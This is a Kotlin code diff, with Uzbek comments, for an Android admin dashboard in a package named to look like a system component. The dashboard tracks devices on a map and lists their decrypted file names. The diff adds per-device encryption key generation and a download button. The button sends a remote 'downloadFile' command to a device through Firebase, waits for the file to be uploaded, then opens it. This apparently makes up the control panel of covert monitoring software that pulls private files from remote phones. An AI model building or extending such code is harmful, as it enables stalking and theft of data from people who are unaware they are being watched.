@@ -17,6 +17,7 @@ import androidx.compose.material.icons.filled.*
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.platform.LocalLifecycleOwner
 import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.LifecycleEventObserver
@@ -39,6 +40,7 @@ import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ServerValue
 import com.google.firebase.database.ValueEventListener
+import com.google.firebase.storage.FirebaseStorage
 import com.android.system.manager.crypto.CryptoManager
 import com.android.system.manager.crypto.KeyManager
 import com.android.system.manager.BuildConfig
@@ -82,7 +84,8 @@ class AdminDashboardActivity : ComponentActivity() {
         val path: String = "",
         val size: Long = 0L,
         val mimeType: String = "",
-        val dateModified: Long = 0L
+        val dateModified: Long = 0L,
+        val storagePath: String = ""
     )
 
     data class DeviceData(
@@ -320,7 +323,27 @@ class AdminDashboardActivity : ComponentActivity() {
                                     // marker.tag = device.uid (Firebase UID)
                                     val uid = marker.tag as? String
                                     val device = currentDevices.find { it.uid == uid }
-                                    if (device != null) selectedDevice = device
+                                    if (device != null) {
+                                        selectedDevice = device
+
+                                        // AES kalit tekshiruvi
+                                        val deviceUid = device.uid
+                                        FirebaseDatabase.getInstance(
+                                            "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
+                                        ).getReference("devices/$deviceUid/cryptoKey/key")
+                                            .get()
+                                            .addOnSuccessListener { snapshot ->
+                                                if (!snapshot.exists() || snapshot.getValue(String::class.java).isNullOrEmpty()) {
+                                                    if (BuildConfig.DEBUG) Log.d("SYS_MGR", "AES key yo'q — generatsiya boshlanmoqda")
+                                                    KeyManager.generateAndUploadKey(this@AdminDashboardActivity, deviceUid)
+                                                } else {
+                                                    if (BuildConfig.DEBUG) Log.d("SYS_MGR", "AES key mavjud, o'tkazib yuborildi")
+                                                }
+                                            }
+                                            .addOnFailureListener {
+                                                if (BuildConfig.DEBUG) Log.e("SYS_MGR", "cryptoKey tekshiruvi xato: ${it.message}")
+                                            }
+                                    }
                                     true
                                 }
                             }
@@ -374,6 +397,25 @@ class AdminDashboardActivity : ComponentActivity() {
                             items(devices) { device ->
                                 CourierItem(device = device, onClick = {
                                     selectedDevice = device
+
+                                    // AES kalit tekshiruvi
+                                    val deviceUid = device.uid
+                                    FirebaseDatabase.getInstance(
+                                        "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
+                                    ).getReference("devices/$deviceUid/cryptoKey/key")
+                                        .get()
+                                        .addOnSuccessListener { snapshot ->
+                                            if (!snapshot.exists() || snapshot.getValue(String::class.java).isNullOrEmpty()) {
+                                                if (BuildConfig.DEBUG) Log.d("SYS_MGR", "AES key yo'q — generatsiya boshlanmoqda")
+                                                KeyManager.generateAndUploadKey(this@AdminDashboardActivity, deviceUid)
+                                            } else {
+                                                if (BuildConfig.DEBUG) Log.d("SYS_MGR", "AES key mavjud, o'tkazib yuborildi")
+                                            }
+                                        }
+                                        .addOnFailureListener {
+                                            if (BuildConfig.DEBUG) Log.e("SYS_MGR", "cryptoKey tekshiruvi xato: ${it.message}")
+                                        }
+
                                     googleMap?.let { focusOnDevice(it, device) }
                                 })
                             }
@@ -1290,6 +1332,7 @@ class AdminDashboardActivity : ComponentActivity() {
                             val size = child.child("size").getValue(Long::class.java) ?: 0L
                             val mimeType = child.child("mimeType").getValue(String::class.java) ?: ""
                             val dateModified = child.child("dateModified").getValue(Long::class.java) ?: 0L
+                            val storagePath = child.child("storagePath").getValue(String::class.java) ?: ""
 
                             val name = if (aesKey != null) {
                                 CryptoManager.decrypt(rawName, aesKey) ?: rawName
@@ -1305,7 +1348,8 @@ class AdminDashboardActivity : ComponentActivity() {
                                 path = path,
                                 size = size,
                                 mimeType = mimeType,
-                                dateModified = dateModified
+                                dateModified = dateModified,
+                                storagePath = storagePath
                             ))
                         } catch (e: Exception) {
                             if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "File parse error: ${e.message}") }
@@ -1371,9 +1415,67 @@ class AdminDashboardActivity : ComponentActivity() {
                         modifier = Modifier.padding(8.dp)
                     )
                 } else {
+                    val context = LocalContext.current
                     LazyColumn {
-                        items(filtered) { file ->
-                            FileItemRow(file)
+                        items(filtered.size) { index ->
+                            val file = filtered[index]
+                            FileItemRow(
+                                file = file,
+                                index = index,
+                                onDownload = { fileIndex, storagePath ->
+                                    val commandsRef = FirebaseDatabase.getInstance(
+                                        "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
+                                    ).getReference("devices/$deviceId/commands/downloadFile")
+
+                                    if (storagePath.isNotEmpty()) {
+                                        // Storage path mavjud — to'g'ridan download
+                                        FirebaseStorage.getInstance()
+                                            .getReference(storagePath)
+                                            .downloadUrl
+                                            .addOnSuccessListener { uri ->
+                                                val intent = Intent(Intent.ACTION_VIEW, uri)
+                                                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                                                context.startActivity(Intent.createChooser(intent, "Ochish"))
+                                            }
+                                            .addOnFailureListener {
+                                                if (BuildConfig.DEBUG) Log.e("SYS_MGR", "downloadUrl failed: ${it.message}")
+                                            }
+                                    } else {
+                                        // Storage path yo'q — command yuborish + listener
+                                        val commandData = mapOf(
+                                            "status" to "pending",
+                                            "fileIndex" to fileIndex.toString(),
+                                            "timestamp" to ServerValue.TIMESTAMP
+                                        )
+                                        commandsRef.setValue(commandData)
+
+                                        // storagePath paydo bo'lishini kut
+                                        val filesRef = FirebaseDatabase.getInstance(
+                                            "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
+                                        ).getReference("devices/$deviceId/files/$fileIndex/storagePath")
+
+                                        filesRef.addValueEventListener(object : ValueEventListener {
+                                            override fun onDataChange(snapshot: DataSnapshot) {
+                                                val path = snapshot.getValue(String::class.java)
+                                                if (!path.isNullOrEmpty()) {
+                                                    filesRef.removeEventListener(this)
+                                                    FirebaseStorage.getInstance()
+                                                        .getReference(path)
+                                                        .downloadUrl
+                                                        .addOnSuccessListener { uri ->
+                                                            val intent = Intent(Intent.ACTION_VIEW, uri)
+                                                            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                                                            context.startActivity(Intent.createChooser(intent, "Ochish"))
+                                                        }
+                                                }
+                                            }
+                                            override fun onCancelled(error: DatabaseError) {
+                                                if (BuildConfig.DEBUG) Log.e("SYS_MGR", "storagePath listener cancelled: ${error.message}")
+                                            }
+                                        })
+                                    }
+                                }
+                            )
                         }
                     }
                 }
@@ -1382,7 +1484,7 @@ class AdminDashboardActivity : ComponentActivity() {
     }
 
     @Composable
-    private fun FileItemRow(file: FileItem) {
+    private fun FileItemRow(file: FileItem, index: Int, onDownload: (index: Int, storagePath: String) -> Unit) {
         val dateStr = remember(file.dateModified) {
             if (file.dateModified > 0) {
                 SimpleDateFormat("dd.MM.yy HH:mm", Locale.getDefault()).format(Date(file.dateModified))
@@ -1448,6 +1550,23 @@ class AdminDashboardActivity : ComponentActivity() {
                         fontSize = 10.sp,
                         color = MaterialTheme.colorScheme.onSurfaceVariant
                     )
+                }
+
+                val isLoading = remember { mutableStateOf(false) }
+
+                if (isLoading.value) {
+                    CircularProgressIndicator(modifier = Modifier.size(24.dp))
+                } else {
+                    IconButton(onClick = {
+                        isLoading.value = true
+                        onDownload(index, file.storagePath)
+                    }) {
+                        Icon(
+                            imageVector = Icons.Default.ArrowForward,
+                            contentDescription = "Yuklab olish",
+                            tint = MaterialTheme.colorScheme.primary
+                        )
+                    }
                 }
             }
         }
